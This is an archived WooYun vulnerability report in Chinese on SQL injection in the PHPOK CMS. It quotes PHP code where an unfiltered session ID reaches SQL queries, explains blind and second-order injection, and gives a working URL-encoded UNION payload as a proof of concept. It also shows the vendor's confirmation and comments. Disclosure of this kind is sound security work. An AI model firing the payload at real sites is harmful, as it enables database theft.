{"id": 43016, "wybug_id": "wooyun-2014-084090", "wybug_title": "phpok 最新版sql注入打包", "wybug_corp": "phpok.com", "wybug_author": "路人甲", "wybug_date": "2014-11-21 13:00", "wybug_open_date": "2015-02-19 13:02", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-24：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-19：\t细节向公众公开  简要描述： RT 详细说明：  网站在初始化的时候会装载一些资源引擎，其中装载了一个session_file.php，用于初始化session\n文件framework/engine/session/file.php:function __construct($config)\t{\t\tif(!$config || !is_array($config))\t\t{\t\t\t$config[\"id\"] = \"PHPSESSID\";\t\t\t$config[\"path\"] = \"./data/session/\";\t\t\t$config[\"timeout\"] = 3600;\t\t}\t\t$this->config($config);\t\t$sid = $config[\"id\"] ? $config[\"id\"] : \"PHPSESSION\";\t\tsession_name($sid);\t\t$this->sid = $sid;\t\t$session_id = isset($_POST[$sid]) ? $_POST[$sid] : (isset($_GET[$sid]) ? $_GET[$sid] : \"\");\t\tif($session_id)\t\t{\t\t\tsession_id($session_id);\t\t\t$this->sessid = $session_id;\t\t}\t\telse\t\t{\t\t\t$this->sessid = session_id();\t\t}\t\tsession_save_path($config[\"path\"]);\t\t$this->config = $config;\t\t$this->timeout = $config[\"timeout\"] ? $config[\"timeout\"] : 600;\t\tsession_cache_expire(intval($this->timeout)/60);\t\tsession_cache_limiter('public');\t\tsession_start();\t}\n$session_id = isset($_POST[$sid]) ? $_POST[$sid] : (isset($_GET[$sid]) ? $_GET[$sid] : \"\");这里$session_id 直接从get或者post中获取，没有进行任何过滤.$this->sessid = $session_id;然后保存$session_id。再看文件framework/www/cart_control.php:\nfunction __construct()\t{\t\tparent::control();\t\t//取得当前的购物车ID\t\t$this->cart_id = $this->model('cart')->cart_id($this->session->sessid(),$_SESSION['user_id']);\t}\n这里调用了一个cart_id的方法，其中第一个参数 就是$this->session->sessid()\nfunction sessid($sid=\"\")\t{\t\tif($sid) $this->sessid = $sid;\t\treturn $this->sessid;\t}\n可以看到 $this->session->sessid() 实际上就是之前的$session_id值。再看方法cart_id\nfunction cart_id($sessid,$uid=0)\t{\t\tif(!$sessid) return false;\t\t$sql = \"SELECT id FROM \".$this->db->prefix.\"cart WHERE session_id='\".$sessid.\"'\";\t\t$rs = $this->db->get_one($sql);\t\tif(!$rs)\t\t{\t\t\t$array = array('session_id'=>$sessid,'user_id'=>$uid,'addtime'=>$this->time);\t\t\t$id = $this->db->insert_array($array,'cart');\t\t}\t\telse\t\t{\t\t\t$id = $rs['id'];\t\t}\t\t//如果已经是会员\t\tif($uid)\t\t{\t\t\t$sql = \"SELECT id FROM \".$this->db->prefix.\"cart WHERE user_id='\".$uid.\"'\";\t\t\t$rs = $this->db->get_one($sql);\t\t\tif($rs && $rs['id'] != $id)\t\t\t{\t\t\t\t//合并购物产品信息\t\t\t\t$this->cart_merge($rs['id'],$id);\t\t\t\t//删除旧的购物车信息\t\t\t\t$this->delete($rs['id']);\t\t\t}\t\t\t//更新购物车属性\t\t\t$sql = \"UPDATE \".$this->db->prefix.\"cart SET user_id='\".$uid.\"' WHERE id='\".$id.\"'\";\t\t\t$this->db->query($sql);\t\t}\t\treturn $id;\t}\n$sql = \"SELECT id FROM \".$this->db->prefix.\"cart WHERE session_id='\".$sessid.\"'\"; 这里直接将$sessid带入到sql语句中直接，再未开启GPC的情况下，可以实现sql注入。但这里面没有回显，报错也被关闭了，可以利用时间盲注。当然我们还可以利用二次注入,且看下面：在cart_control.php中:\nfunction index_f()\t{\t\t//取得购物车产品列表\t\t$rslist = $this->model('cart')->get_all($this->cart_id);}function checkout_f()\t{\t\t//echo \"<pre>\".print_r($this->site,true).\"</pre>\";\t\t$rslist = $this->model('cart')->get_all($this->cart_id);}\n这些方法中都用了$this->model('cart')->get_all($this->cart_id);\nfunction get_all($cart_id)\t{\t\tif(!$cart_id) return false;\t\t$sql = \"SELECT * FROM \".$this->db->prefix.\"cart_product WHERE cart_id='\".$cart_id.\"'\";\t\t$rslist = $this->db->get_all($sql);\t\tif(!$rslist) return false;\t\tforeach($rslist AS $key=>$value)\t\t{\t\t\t//如果未指定tid，跳过\t\t\tif(!$value['tid']) continue;\t\t\t$arc_rs = $this->call->phpok(\"_arc\",array(\"id\"=>$value['tid']));\t\t\tif($arc_rs)\t\t\t{\t\t\t\t$value = array_merge($arc_rs,$value);\t\t\t\t$rslist[$key] = $value;\t\t\t}\t\t}\t\treturn $rslist;\t}\n可以看到cart_id带入到了sql语句中，这样二次注入就可以实现了poc:index.php?c=cart&PHPSESSION=%27%20union%20select%20%27%5C%27%20union%20select%201%2C2%2C3%2Cuser%28%29%2C5%2Cdatabase%28%29%2C7%23%27%23\n\n同样的漏洞还出现在 order_control.php：\nclass order_control extends phpok_control{\tfunction __construct()\t{\t\tparent::control();\t\t//取得当前的购物车ID\t\t$this->cart_id = $this->model('cart')->cart_id($this->session->sessid(),$_SESSION['user_id']);\t}//这里同样的错误，直接带入数据库了 和前面一样的道理\tfunction create_f()\t{\t\t$rslist = $this->model('cart')->get_all($this->cart_id);//这里可以执行二次注入\n   漏洞证明：  poc:index.php?c=cart&PHPSESSION=%27%20union%20select%20%27%5C%27%20union%20select%201%2C2%2C3%2Cuser%28%29%2C5%2Cdatabase%28%29%2C7%23%27%23\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-11-21 13:25 厂商回复： 狂汗啊，这也能找到，又得补洞了！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-22 02:32 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  我的天！我昨天也提交了，现在都还没审，估计重复啦    \n     2014-12-11 15:05 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  好厉害    \n     2014-12-16 10:17 |    \t\t黑吃黑 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:29        | 倚楼听风雨，淡看江湖路...)\t\t \n  值得学习    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}